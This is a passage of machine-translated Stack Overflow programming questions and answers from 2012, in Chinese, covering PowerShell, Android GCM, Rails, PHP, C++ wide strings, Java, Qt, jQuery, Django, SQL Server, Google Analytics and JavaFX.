> 赞同：0
> 
> 时间：2012-11-13T11:56:01.477

这就是你想要的——

```
 new MyClass(reportGroup, r => r.ID != 0) 
```

# powershell - PowerShell中这是什么？

> ID：13360218
> 
> 赞同：1
> 
> 时间：2012-11-13T11:47:30.223
> 
> 标签：powershell

在 powershell 文件的顶部，我看到了这个。这是一个匿名对象，我该如何访问`$foo`？

```
properties {

  $foo = "bar"
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:54:48.393

您正在查看的文件看起来像是使用 psake 框架

[Psake 框架属性](https://github.com/psake/psake/wiki/How-can-I-override-a-property-defined-in-my-psake-script?)

# android - 如何重命名或移动 GCMIntentService

> ID：13360219
> 
> 赞同：2
> 
> 时间：2012-11-13T11:47:32.633
> 
> 标签：android, push-notification, google-cloud-messaging

我想将 GCMIntentService 放在我的包根目录以外的目录中。

GCM[文档](http://developer.android.com/guide/google/gcm/gs.html)指出

> ```
>  By default, it must be named .GCMIntentService, unless the
>       application uses a custom BroadcastReceiver that redefines its name. 
> ```

我的问题是 - 我如何创建这个“自定义广播接收器”？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:30:00.550

基本文档让您将以下内容添加到清单中：

```
<receiver android:name="com.google.android.gcm.GCMBroadcastReceiver" android:permission="com.google.android.c2dm.permission.SEND" >
  <intent-filter>
    <action android:name="com.google.android.c2dm.intent.RECEIVE" />
    <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
    <category android:name="my_app_package" />
  </intent-filter>
</receiver> 
```

这指向 GCM 提供`BroadcastReceiver`的将事件路由到您的`.GCMIntentService`. 如果您希望您的服务驻留在其他包中，则需要提供自己的`BroadcastReceiver`. 这可能就像创建一个子类`GCMBroadcastReceiver`和覆盖`getGCMIntentServiceClassName()`以返回要使用的服务的完全限定类名一样简单。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T14:49:24.570

试试这个——[重命名或更改 GCMIntentService 类的包](http://dexxtr.com/post/28188228252/rename-or-change-package-of-gcmintentservice-class)

# ruby-on-rails - 瑞克失败了！未初始化的常量知道

> ID：13360224
> 
> 赞同：0
> 
> 时间：2012-11-13T11:48:13.203
> 
> 标签：ruby-on-rails, ruby, rake

我正在建立一个运行 MySQL 的新 Ubuntu 服务器。我在我的开发服务器上设置了 Capistrano，并在运行 deploy:setup 后尝试 deploy:cold。部署脚本尝试运行后

```
executing "cd /home/adm1n/www/knowit/releases/20121112152400 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile" 
```

我不断收到此消息：

```
Rake Aborted!
uninitialized constant knowit
Tasks: TOP => environment 
```

知道这个常量在哪里定义吗？这个项目几乎是全新的（rails new app Blah）。关于我应该如何尝试解决这个问题的任何建议？谢谢。

我在跑：

*   耙 0.9.2.2
*   红宝石 1.9.3p194
*   卡皮斯特拉诺 2.13.5
*   捆绑器 1.1.5
*   导轨 3.2.8
*   转速 1.15.7

更新：knowit 是我的应用程序的名称。所以显然有一些东西没有初始化。不知道如何解决这个问题。

更新：这是我的 routes.rb 文件（非常基本）

```
 Knowit::Application.routes.draw do
  match ':controller(/:action(/:id))(.:format)'
 end 
```

# php - 产生随机数错误

> ID：13360226
> 
> 赞同：0
> 
> 时间：2012-11-13T11:48:14.630
> 
> 标签：php

我正在测试基于此评论在 php 文档中找到的 php 函数： [http ://www.php.net/manual/en/function.rand.php#108861](http://www.php.net/manual/en/function.rand.php#108861)

```
<?php

    function RandNumber($e) {

        for ($i = 0; $i < $e; $i++) {
            $rand =  $rand .  rand(0, 9);  
        }
        return $rand;
    }

    echo RandNumber(4);
    // Outputs a 6 digit random number
?> 
```

我收到错误通知：

> 未定义变量：第 7 行 /var/www/eod.php 中的 rand

这是第 7 行：

```
$rand =  $rand . rand(0, 9); 
```

由于该功能按预期工作，为什么会导致此错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:49:30.317

初始化您的`$rand`变量以删除此警告：

```
 function RandNumber($e){
     $rand="";
     for($i=0;$i<$e;$i++){
        $rand =  $rand.rand(0, 9);  
     }
     return $rand;
 } 
```

请注意，您可以简化代码：

```
 function RandNumber($e){
     $rand="";
     for(;$e-->0;){ // no need for an additional variable
        $rand .= rand(0, 9); // addition and assignement with one operator  
     }
     return $rand;
 } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T11:51:57.530

要输出一个随机的 6 位数字（如果您需要更大的数字，大于`mt_getrandmax()`，此解决方案将失败），只需使用

```
mt_rand(100000, 999999); 
```

要包含带前导零 ( `000123`) 的数字，您可以使用`my_rand(0, 999999)`和的组合`str_pad($number, 6, "0", STR_PAD_LEFT);`

不需要花哨的循环。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T11:50:59.980

这不是错误.. 这是一条通知消息.. 如果您不想出现该通知，您应该在执行循环之前定义它：

```
$rand = '';

for($i=0;$i<$e;$i++){
 $rand =  $rand .  rand(0, 9);  
} 
```

# c++ - C++ WCHAR 操作

> ID：13360228
> 
> 赞同：6
> 
> 时间：2012-11-13T11:48:19.217
> 
> 标签：c++, string, winapi, char, wchar

我正在用 C++ 开发一个小型 Win32 应用程序。我很久以前就研究过C++基础知识，所以现在我完全被C++中的字符串弄糊涂了。没有`WCHAR`或`TCHAR`只有`char`和`String`。经过一番调查，我决定不使用`TCHAR`.

我认为我的问题非常简单，但我找不到如何在 C++ 中操作字符串的明确指南。受过去几年 PHP 编码的影响，我期待一些简单的字符串操作，但错了！

简单地说，我需要的只是将新数据放入字符串中。

```
 WCHAR* cs = L"\0";
    swprintf( cs, "NEW DATA" ); 
```

这是我的第一次尝试。在调试我的应用程序时，我调查过 swprintf 仅将前 2 个字符放入我的 cs var。我已经通过这种方式解决了我的问题：

```
 WCHAR cs[1000];
    swprintf( cs, "NEW DATA" ); 
```

但通常这个技巧可能会失败，因为在我的情况下，新数据不是常量值而是另一个变量，它可能比 1000 字符长更宽。我的代码是这样的：

```
 WCHAR cs[1000];
    WCHAR* nd1;
    WCHAR* nd2;
    wcscpy(nd1, L"Some value");
    wcscpy(nd2, L"Another value"); // Actually these vars stores the path for user selected folder
    swprintf( cs, "The paths are %s and %s", nd1, nd2); 
```

在这种情况下，nd1 和 nd2 的总字符数可能大于 1000 个字符，因此关键数据将丢失。

问题是如何将我需要的所有数据复制到以这种方式声明的 WCHAR 字符串`WCHAR* wchar_var;`而不丢失任何内容？

PS 因为我是俄罗斯人，所以问题可能不清楚。现在让我谈谈这一点，我将尝试更清楚和更复杂地解释我的问题。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T11:58:03.717

在现代 Windows 编程中，可以忽略`TCHAR`并使用`wchar_t`( `WCHAR`) 和 Unicode UTF-16。

（`TCHAR`是过去的模型，当您想要拥有一个单一的代码库并生成 ANSI/MBCS 和 Unicode 版本时，会更改一些预处理器开关，例如`_UNICODE`和`UNICODE`。）

在任何情况下，您都应该使用 C++ 和方便的**字符串类**来简化您的代码。您可以使用`ATL::CString`（对应`CStringW`于 Unicode 构建，这是自 VS2005 以来的默认设置）或 STL 的`std::wstring`.

使用`CString`，您可以执行以下操作：

```
CString str1 = L"Some value";
CString str2 = L"Another value";
CString cs;
cs.Format(L"The paths are %s and %s", str1.GetString(), str2.GetString()); 
```

`CString`还提供了适当的重载`operator+`来连接字符串（因此您不必计算结果字符串的总长度，为目标字符串动态分配缓冲区或检查现有缓冲区大小，调用`wcscpy`，，`wcscat`不要忘记释放缓冲区， ETC。）

并且您可以简单地将 的实例传递`CString`给期望`const wchar_t*`( `LPCWSTR/PCWSTR`) 参数的 Win32 API，因为`CString`它提供了一个隐式转换运算符到`const wchar_t*`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T11:57:50.650

当你使用 a`WCHAR*`时，你正在调用未定义的行为，因为你有一个指针，但没有让它指向任何有效的东西。您需要找出结果字符串的长度并为字符串动态分配空间。例如：

```
WCHAR* cs;
WCHAR* nd1;
WCHAR* nd2;

nd1 = new WCHAR[lstrlen(L"Some value") + 1]; // +1 for the null terminator
nd2 = new WCHAR[lstrlen(L"Another value") + 1];
cs = new WCHAR[lstrlen(L"The paths are  and ") + lstrlen(nd1) + lstrlen(nd2) + 1];

wcscpy(nd1, L"Some value");
wcscpy(nd2, L"Another value"); // Actually these vars stores the path for user selected folder
swprintf( cs, L"The paths are %s and %s", nd1, nd2);

delete[] nd1;
delete[] nd2;
delete[] cs; 
```

但这是非常丑陋且容易出错的。如前所述，您应该`std::wstring`改用如下内容：

```
std::wstring cs;
std::wstring nd1;
std::wstring nd2;

nd1 = L"Some value";
nd2 = L"Another value";
cs = std::wstring(L"The paths are ") + nd1 + L" and " + nd2; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:10:49.363

建议使用 ATL`CStringW`类而不是 raw `WCHAR`，这样更方便。`CString`是动态分配的 C 字符串的包装器。它将在每次操作后适当地管理字符串长度和分配的内存缓冲区，因此您不会关心它。

典型用法：

```
#include <atlstr.h>

CStringW s;
s.Format(L"The paths are %s and %s", L"Some value", L"Another value");
const WCHAR* wstr = s.GetString(); // To pass to some API that need WCHAR 
```

或者

```
#include <atlstr.h>

CStringW s(L"The paths are ");
s += L"Some value";
s += L" and ";
s += L"Another value";
const WCHAR* wstr = s.GetString(); // To pass to some API that need WCHAR 
```

# java - StringBuilder 最有效的初始容量大小？

> ID：13360229
> 
> 赞同：5
> 
> 时间：2012-11-13T11:48:25.823
> 
> 标签：java, memory, stringbuilder

我正在写很多东西来登录突发，并优化数据路径。我用 构建日志文本`StringBuilder`。什么是最有效的初始容量，内存管理明智的，所以不管JVM如何它都能很好地工作？目标是几乎总是避免重新分配，这应该由大约 80-100 的初始容量覆盖。但我也希望尽可能少地浪费字节，因为 StringBuilder 实例可能会在缓冲区中徘徊并且浪费的字节突然出现。

我意识到这取决于 JVM，但应该有一些价值，这将浪费最少的字节，不管 JVM，有点“最小公分母”。我目前正在使用`128-16`，其中 128 是一个不错的整数，减法用于分配开销。此外，这可能被认为是“过早优化”的情况，但由于我所追求的答案是“经验法则”数字，因此知道它在未来也会很有用。

我不期待“我最好的猜测”答案（我自己上面的答案已经是那个），我希望有人已经对此进行了研究并且可以分享基于知识的答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:48:36.530

在这种情况下不要试图变得聪明。

> 我目前使用的是 128-16，其中 128 是一个不错的整数，减法用于分配开销。

在 Java 中，这是基于对 JVM 内部工作的完全任意假设。Java 不是 C。字节对齐等绝对*不是*程序员可以或应该尝试利用的问题。

如果您知道字符串的（可能）最大长度，则可以将其用于初始大小。除此之外，任何优化尝试都是徒劳的。

如果你*真的知道*你的大量`StringBuilder`s 会存在很长一段时间（这不太符合日志记录的概念），*并且*你真的觉得有必要尝试说服 JVM 节省一些字节的堆空间，你可能会[`trimToSize()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/StringBuilder.html#trimToSize%28%29)在字符串完全构建后尝试使用。但是，再一次，只要你的字符串不浪费每个兆字节，你真的应该去关注应用程序中的其他问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T13:52:22.340

好吧，我最终自己对此进行了简短的测试，然后在评论后进行了更多测试，以获得这个经过编辑的答案。

使用 JDK 1.7.0_07 和测试应用程序报告 VM 名称“Java HotSpot(TM) 64-Bit Server VM”，`StringBuilder`内存使用粒度为 4 个*字符*，甚至增加 4 个字符。

答：至少在这个 64 位 JVM 上，从内存分配的角度来看，**任何 4 的倍数对于 StringBuilder 来说都是同样好的容量。**

通过创建 1000000 个具有不同初始容量的 StringBuilder 对象进行测试，在不同的测试程序执行中（具有相同的初始堆状态），并在`ManagementFactory.getMemoryMXBean().getHeapMemoryUsage().getUsed()`之前和之后打印出来。

打印出堆大小也证实了，实际上从堆中为每个`StringBuilder`缓冲区分配的数量是 8 个字节的偶数倍，正如预期的那样，因为 Java char 是 2 个字节长。换句话说，分配初始容量为 1..4 的 1000000 个实例比分配初始容量为 5...8 的相同数量的实例少大约 8 兆字节的内存（每个实例 8 字节）。

# rtc - 我可以在交付后将更改集与工作项相关联吗？

> ID：13360232
> 
> 赞同：1
> 
> 时间：2012-11-13T11:48:36.187
> 
> 标签：rtc

如果我将更改集交付给流并且未将其与工作项关联，那么更改集是否可以在交付后与工作项关联？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:14:41.277

是的。

变更集本身在交付到流时关闭。
但其关联的工作项不是：您可以添加或删除与交付的变更集相关的一个或多个工作项。

话虽如此，我有一个特殊的钩子，它使该关联在交付时是强制性的：即，如果不首先将您的更改集与工作项相关联，您就无法交付。

我不确定该钩子是否是我组织的自定义钩子，但您可以在此处检查它是否存在：

它在项目区管理中，在

```
Team Configuration / 
Operation Behavior / 
Source Control / 
Deliver (client) / 
Preconditions and follow-up actions are configured for this operation / 
Require Work Items and comments 
```

![需要工作项挂钩](../Images/2787eada34df98752f62172f0aa7f40d.png)

# qt - 如何将整数转换为 qbitarray？

> ID：13360239
> 
> 赞同：0
> 
> 时间：2012-11-13T11:49:26.350
> 
> 标签：qt

如何从 qint 值中获取 QBitArray？我需要更改一些位数，所以我想使用 QBitArray 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-01-12T14:15:35.030

QBitArray 的 '>>' 运算符期望位集大小为前 4 个字节，因此 JustMaximumPower 的snipper 将不起作用。正确的数据流应如下所示：

```
QBitArray bits;

quint32 size = 32;
quint32 value = 1337;
QByteArray data;
QDataStream stream(data, QIODevice::ReadWrite);
stream << size << value;
stream.device()->seek(0);
stream >> bits; 
```

其实我觉得 QBitArray 不是很有用。您可以尝试 std::vector<bool> 用于可变大小或 std::bitset 用于固定大小（均来自 STL 库）。

```
std::bitset<32> bits(1337);
bits[0] = 1; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:17:30.707

不是 testet 但应该可以工作：

```
qint value = 1337;
QBitArray bits;
QDataStream stream;

stream << value;
bits << stream; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-13T12:18:57.037

如果您只想更改一些位，那就`QBitArray`大材小用了。

```
int bitmask = 1 << 3; // let's change 4th bit
bitmask = 0x55555555; // or perhaps all odd bits

int number = 12345678;
number |= bitmask; // set to 1s
number &= ~bitmask; // set to 0s
number ^= bitmask; // negate what's already there 
```

# php - 从外部点击加载

> ID：13360241
> 
> 赞同：0
> 
> 时间：2012-11-13T11:49:36.373
> 
> 标签：php, jquery, load

这是我的 test.php 页面，我正在尝试加载`<< id="new-nav" >>`外部页面的内容。

情景如下：我想从我的菜单中单击 li并在该区域 `<?php include 'Menu/Side-menu.html.php'; ?>`的 test.php 中加载内容 `<< id="new-nav" >>`

```
<div id="left"> 
<?php include 'Menu/Side-menu.html.php'; ?> 
</div> 

<div id="main"> 
<p>This is a test</p> 

<b>see the text:</b> 
<ol id="new-nav"></ol> 
</div> 

<script> 
$(document).ready(function(){ 

  $("#test li").click(function (e) { 

    // Stop the link from changing the page 
    e.preventDefault(); 

    // Your jQuery code. 
    $("#new-nav").load(('Menu/Side-menu.html.php').attr("href")); 
  }); 

}); 
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:58:51.733

我建议您改用此解决方案：

```
 $("#test li").click(function (e) { 

    // Stop the link from changing the page 
    e.preventDefault(); 

    // Your jQuery code. 
    $.post('Menu/Side-menu.html.php',function(response) { // (added quotes)
         $("#new-nav").html(response);
    });
 }); 
```

# performance - 调整 CMU Sphinx

> ID：13360247
> 
> 赞同：3
> 
> 时间：2012-11-13T11:49:54.063
> 
> 标签：performance, cmusphinx, sphinx4

我正在尝试构建一个基于 CMU Sphinx 的语音识别应用程序。我使用 lmtool 创建了自己的语言模型。但是为了提高识别的准确率，我想对Sphinx进行调优。但是对于选择absoluteBeamWidth、relativeBeamWidth、absoulteWordBeamWidth、languageWeight等属性是否有任何指导方针。我不确定这些属性是什么意思。此外，任何可以帮助我调整 Sphinx 的资源链接（不包括 sphinx 网站上不完整的调整链接）都将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T10:06:45.767

> 但是为了提高识别的准确率，我想对Sphinx进行调优。

准确性不是通过调整来提高的，而是通过使用更好的模型和更高级的算法来提高的。有关详细信息，请参阅常见问题解答：

[http://cmusphinx.sourceforge.net/wiki/faq#qwhy_my_accuracy_is_poor](http://cmusphinx.sourceforge.net/wiki/faq#qwhy_my_accuracy_is_poor)

# python - Django 数据库错误：未安装 social_auth 时缺少表 social_auth_usersocialauth

> ID：13360251
> 
> 赞同：6
> 
> 时间：2012-11-13T11:50:16.633
> 
> 标签：python, django, tastypie

我正在尝试处理 Django 应用程序中一个非常令人费解的错误。当 DEBUG=False 时，尝试删除用户（通过`user.delete()`）会出现以下数据库错误：

```
DatabaseError: relation "social_auth_usersocialauth" does not exist
LINE 1: ...", "social_auth_usersocialauth"."extra_data" FROM "social_au... 
```

但是，我在 INSTALLED_APPS 中没有 social_auth 或类似名称的任何东西，我的数据库中也没有任何这样的表，我的任何代码也没有引用任何类似的东西（我在整个 'social' 上运行了文本搜索项目文件夹） - 同样，当 DEBUG=True 时，这工作正常。social_auth 安装在我的系统和我的 PYTHONPATH 上，但我看不出这个应用程序从哪里得到它应该在其数据库中拥有 social_auth 表的想法，更不用说为什么它只在 DEBUG=False 时才这么认为。

我的应用程序可以从哪些可能的途径获取此表，我如何说服它不应该存在？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T22:34:39.500

该问题可能是由[Django 内容类型](https://docs.djangoproject.com/en/dev/ref/contrib/contenttypes/)实现的保存的**通用关系**引起的。Django 中的关系不仅是静态的，由模型实现，而且是动态的，由保存从数字 id 到 app_label + 模型的映射的表实现。可能的动态关系的一个示例是权限或评论。您可以拥有或不拥有任何已安装应用程序的任何表的权限。您可以在不更改任何模型的情况下对所有内容（例如文章、用户对评论本身）进行评论。这种关系是通过保存与该模型（表）相关的 ContentType 的数字 id 和相关对象（行）的主键来实现的。`INSTALLED_APPS``django_content_type`

Django 不希望有人可以手动操作数据库。如果您使用[south](http://south.readthedocs.org/en/0.7.6/)进行操作，那么如果您在卸载应用程序后运行`syncdb`，则 south 会询问您是否要自动删除孤立的内容类型。然后可以安全地删除未使用的表，而无需稍后引用。

（可能的黑客攻击：`delete from django_content_type where app_label='social_auth'`但`south`绝对可靠。）

问题的许多部分仍然悬而未决。

**编辑**：
为什么它不是正确的方法：所有通用关系都是从后代到父级，并且有关该关系的所有数据都保存在后代中。如果从 INSTALLED_APPS 中删除子应用程序，则 django.db 代码将永远无法尝试删除后代，因为它无法识别哪些列包含关系数据。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-13T19:25:36.863

此表由`django-social-auth`应用程序创建。

看起来您已将其添加到您的项目中并且尚未启动`migrate`（或`syncdb`）。

# asp.net - 如何根据表中的顺序选择列

> ID：13360253
> 
> 赞同：1
> 
> 时间：2012-11-13T11:50:24.233
> 
> 标签：asp.net, sql, sql-server-2008, oracle11g

我想根据它的顺序从表中选择列

```
create Table Products
(
  ProductId Int,
  ProductName varchar(50)
) 
```

假设我不知道第二列的名称。

我怎么能得到它：

```
Select Col1,Col2 From Product 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:57:09.210

**对于 SQL Server：**

您不能在`SELECT`子句中执行此操作。不能根据列的序号进行选择。您必须列出需要明确选择的列名，否则，请使用`SELECT *`列出所有。我是，如果您使用数据读取器对象或任何其他 ado.net 方法从数据库中获取数据，您可以执行类似的操作，但这将基于您的 SQL 语句中列出的列名列表。

但是，您可以通过从以下答案中读取列的元数据`ordinal_position`来`information_schema.columns`动态地执行此类操作：

*   [**是否可以使用列序号位置选择 sql server 数据？**](https://stackoverflow.com/a/368578/722783)

但是，您可以在`ORDER BY`子句中执行此操作。您可以`ORDER BY`列号：

```
SELECT *
FROM TableName
ORDER BY 2; -- for col2 
```

但这不建议在 in`ORDER BY`或 in `SELECT`(如果有的话) 中使用。此外，列顺序在关系模型中并不重要。

**更新：**如果要从传递给存储过程的任何表参数中选择至少 3 列。试试这个：

您的存储过程应该接收一个参数`@tableNameParam`。以下代码应返回传递给存储过程的*前三*列：`@tablenameParam`

```
DECLARE @col1 AS VARCHAR(100);
DECLARE @col2 AS VARCHAR(100);
DECLARE @col3 AS VARCHAR(100);
DECLARE @tableNameParam AS VARCHAR(50) = 'Tablename';

DECLARE @sql AS VARCHAR(MAX) ;

SELECT @col1 = column_name FROM information_schema.columns 
                           WHERE table_name = @tableNameParam
                             AND ordinal_position = 1;

SELECT @col2 = column_name FROM information_schema.columns 
                           WHERE table_name = @tableNameParam;
                             AND ordinal_position = 2;

SELECT @col3 = column_name FROM information_schema.columns 
                           WHERE table_name = @tableNameParam;
                             AND ordinal_position = 3;

SET @sql = 'SELECT ' + col1 + ',' + col2 ' + 'col3 ' + FROM ' + @tablename; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T11:55:22.523

你总能做到

```
select * from Product 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-04T16:36:43.053

我想分享以下代码作为对表格中序数位置进行 CRUD 处理的解决方案。我今天遇到了这个问题，我花了很长时间研究并找到一个可行的解决方案。许多发布的答案表明不可能与序数基础上的表列进行交互，但如上面的帖子中所示，使用 information_schema 表将允许使用列位置。

我的情况是与通过使用透视视图填充的表进行交互，因此列总是根据数据而变化，这在视图结果中很好，但是当数据集存储到表中时，列是动态的。列名是年-月组合，例如 201801、201802，以项目编号作为主键。此数据透视表用于在滚动的 12 个月期间按年到月指示制造数量，因此每个月的列名称都带有更改/移位，这会在每个月重建表时更改其序数位置。

Pivot 视图用于构建 Staging 表，Staging 表用于构建 Target 表，因此 staging 表和目标表的序号位置与相同的序号位置对齐。

```
 Declare @colname    Varchar(55) -- Column Name
            Declare @ordpos     INT         -- Ordinal Position
            Declare @Item       Varchar(99) -- PK
            Declare @i          INT         -- Counter
            Declare @cnt        INT         -- Count
            Declare @ids        table(idx int identity(1,1), Item Varchar(25))
        -- Item List
                Insert INTO @ids Select Item From DBName.Schema.TableName   
                    select @i = min(idx) - 1, @cnt = max(idx) from @ids
        -- Row Loop
                While @i < @cnt
                Begin
                    Select @i = @i + 1
                    Set @ordpos=3
                    Set @Item = (select Item from @ids where idx = @i)
        --   Column Loop
                    While @ordpos < 27
                        Begin
                            Select @colname =column_name From INFORMATION_SCHEMA.Columns Where table_name='TargetTable' and ordinal_position=@ordpos
                            Exec ('Update TargetTable set ['+@colname+']= (Select ['+@colname+'] From StagingTable Where Item='''+@Item+''')         where Item='''+@Item+'''')
                            Set @ordpos=@ordpos + 1
                        End -- End Column Loop
                End -- End Row Loop 
```

此处的代码将按行和按列循环遍历 Item 矩阵，并使用动态 SQL 来构建操作，在这种情况下，操作是更新，但它也可以很容易地成为选择。通过 While 循环处理每一列，然后循环下一行。这允许通过 (Item X YearMonth) 更新矩阵中的特定单元格，而无需实际知道给定位置的列名称。

一个问题是，根据该矩阵中数据的大小，它可能会很慢。我只是想将其展示为在序数位置使用未知列名的一种方式。

# google-analytics - Google Analytics - 访问时长 0 秒

> ID：13360263
> 
> 赞同：17
> 
> 时间：2012-11-13T11:50:49.823
> 
> 标签：google-analytics, google-analytics-api

我正在使用 Google Web Analytics Online Tool 来监控对我网站的访问。令我烦恼的是，我经常看到记录包含以下条目：

页面访问量：1.00 平均访问时长：00:00:00 跳出率：100%

这意味着什么？如果访问者来到我的网站，它应该至少停留几秒钟直到他离开？这是否意味着访问我的网站有问题（我之前也遇到过类似的问题，但我确信我已修复它们，因为当我尝试从不同的计算机访问我的网站时没有遇到任何错误。）

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-11-13T13:43:03.107

当访问者访问您的页面时，谷歌分析会设置一个存储时间戳的 cookie。当用户访问您网站中的第二个页面时，Google 会将存储的时间戳与实际时间进行比较，并根据两者之间的差异计算访问持续时间。如果您的所有访问者都已反弹，则没有第二个数据点可与存储的值进行比较，并且 google 无法计算持续时间。

一种常见的解决方法是设置 javascript 超时并在十秒左右后触发事件（事件中的“交互”标志设置为 true，有关详细信息，请参阅 Google Analytics 事件跟踪文档）。假设在您的页面上查找超过 10 秒的人实际上并不是跳出（我认为，由于“跳出率”具有如此巨大的负面含义，因此即使以引入不良数据为代价，人们也会试图避免高跳出率；您应该意识到“跳出率”仅仅意味着没有足够的数据点来说明这些特定访问者的任何有意义的事情）。

我个人不喜欢这种方法，因为它意味着将访客的不作为重新定义为行动。一个更好的想法 (IMO) 是实现一个有意义的交互点——比如通过 ajax 或类似的东西加载内容的“阅读更多”链接——并通过事件跟踪或虚拟页面视图来跟踪它。

事件跟踪指南： [https ://developers.google.com/analytics/devguides/collection/gajs/eventTrackerGuide](https://developers.google.com/analytics/devguides/collection/gajs/eventTrackerGuide)

**简短更新：**使用 Universal Analytics，技术细节发生了变化（即不再有带有时间戳的 cookie，所有信息都在 GA 服务器上处理）。所以第一段不再是最新的，但其余的答案仍然有效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-30T13:24:18.447

我遇到了类似的问题，我监控了这些展示位置，最近发现流量几乎没有到达我的网站，最近的实验表明这些展示位置是通过 GDN 的点击触发的，但人们甚至没有到达我的页面，被阻止弹出窗口阻止程序或其他类似软件

# package - 包中模块的 PyCharm 检查错误

> ID：13360272
> 
> 赞同：2
> 
> 时间：2012-11-13T11:51:21.067
> 
> 标签：package, pycharm, inspection

为什么 PyCharm 的检查会抱怨这个？

```
import mypackage; 
mypackage.mymodule  # inspection hilights mymodule 
```

我得到的消息是：“在'mypackage'中找不到引用'mymodule'”。但是，程序运行没有问题。插入解决`import mymodule`了`__init__.py`这个问题，但会产生其他问题。

# java - 独立桌面应用程序中表示层的 JavaFX

> ID：13360274
> 
> 赞同：4
> 
> 时间：2012-11-13T11:51:27.507
> 
> 标签：java, user-interface, javafx, desktop-application

我们将创建一个 java 独立的桌面应用程序。我们正在寻找表示层的最佳解决方案。我看到了 javaFX 并且非常喜欢它，但我有点困惑。它可以在独立的桌面应用程序中使用吗？

我可以在我的独立桌面应用程序中使用 javaFX 并使用 css 来设置 UI 样式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:34:19.360

完全可以在独立的桌面应用程序中使用 JavaFX 并对其应用 CSS 样式。

在 JavaFX 的行话中，这被称为[“独立”或“自包含”部署](http://docs.oracle.com/javafx/2/deployment/deploy_overview.htm#CEGHEAHD)。

如果需要，您甚至可以将其与[Swing](http://docs.oracle.com/javafx/2/swing/jfxpub-swing.htm)或[SWT](http://docs.oracle.com/javafx/2/swt_interoperability/jfxpub-swt_interoperability.htm)集成。但请注意，反过来是不可能的。

# java - 在 R 中增加 Java 堆大小没有效果

> ID：13360279
> 
> 赞同：1
> 
> 时间：2012-11-13T11:52:12.483
> 
> 标签：java, macos, r, rjava

在 Linux 和 Windows 上我调用

```
options( java.parameters="-Xmx512m" ) 
```

在加载任何依赖于`rJava`. `XLConnect`特别是在使用（使用 Apache POI）读取和写入大型 Excel 文件时，这变得很有必要。但是，在我的 Mac (OSX 10.8) 上，这似乎没有效果：

```
options( java.parameters="-Xmx512M" )
library("XLConnect")
> Loading required packages: XLConnectJars
> Loading required packages: rJava
> XLConnect 0.2-1 by Mirai Solutions GmbH
> http://www.mirai-solutions.com ,
> http://miraisolutions.wordpress.com
xlcMemoryReport()
> Amount of free memory in the Java Virtual Machine (JVM):  60.72328 MB 
```

我的Java版本是：

```
java version "1.7.0_07"
Java(TM) SE Runtime Environment (build 1.7.0_07-b10)
Java HotSpot(TM) 64-Bit Server VM (build 23.3-b01, mixed mode) 
```

有什么我可能错过的提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:13:33.700

你真的得到 OutOfMemory 错误吗？

堆在需要之前可能不会增长到最大大小，因此报告的“空闲内存”将只是当前分配中可用的内存（如果需要，可以允许扩展，直到最终达到最大值）。

# android - android内核如何控制android中的触摸屏

> ID：13360280
> 
> 赞同：2
> 
> 时间：2012-11-13T11:52:12.287
> 
> 标签：android, kernel, touchscreen

android内核如何控制android中的触摸屏。

其实我想要控制android触摸屏（显示）的android内核算法。

我的主要问题是如何通过根据我的程序更改 android 内核来更改显示部分而不触摸显示器。

请提出答案/链接...

# facebook - 野火与应用

> ID：13360282
> 
> 赞同：0
> 
> 时间：2012-11-13T11:52:24.047
> 
> 标签：facebook

请原谅初学者的问题，但我在这里的研究只显示特定的编程问题。

我目前正在使用 Wildfire 应用程序为比赛创建 fb 页面等等，但不喜欢它们的所见即所得性质。我希望能够在 Facebook 中构建页面，以便更好地控制其布局和设计。

这里有没有人熟悉 Wildfire 应用程序，您能否向我解释一下如何摆脱这样的 3rd 方应用程序？

**同样的注意事项：在** 不疯狂地尝试创建深深植根于 facebook 的 fb 游戏的情况下，是否有可能构建 fb 页面/应用程序，例如抽奖活动，可能仅使用 html/css/javascript 发布到用户墙的竞赛？还是被迫成为一名 PHP 开发人员？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:22:00.623

如果您不想再使用 3rd 方应用程序，那自然意味着创建自己的应用程序。

您不一定需要 PHP 或任何服务器端脚本语言——至少您可以在应用程序中做的*大部分*事情也可以在客户端完成。（只有几个方面，fe 发布 Open Graph 操作时，您可以指定只能使用应用程序密码完成发布 - 这意味着没有人可以“伪造”发布来自您的应用程序的操作，但它还需要在服务器端完成，因为您不想将您的应用程序机密发布到客户端。对于*需要*您的应用程序令牌的任何其他请求也是如此 - 您也不想将其泄露给客户端。）

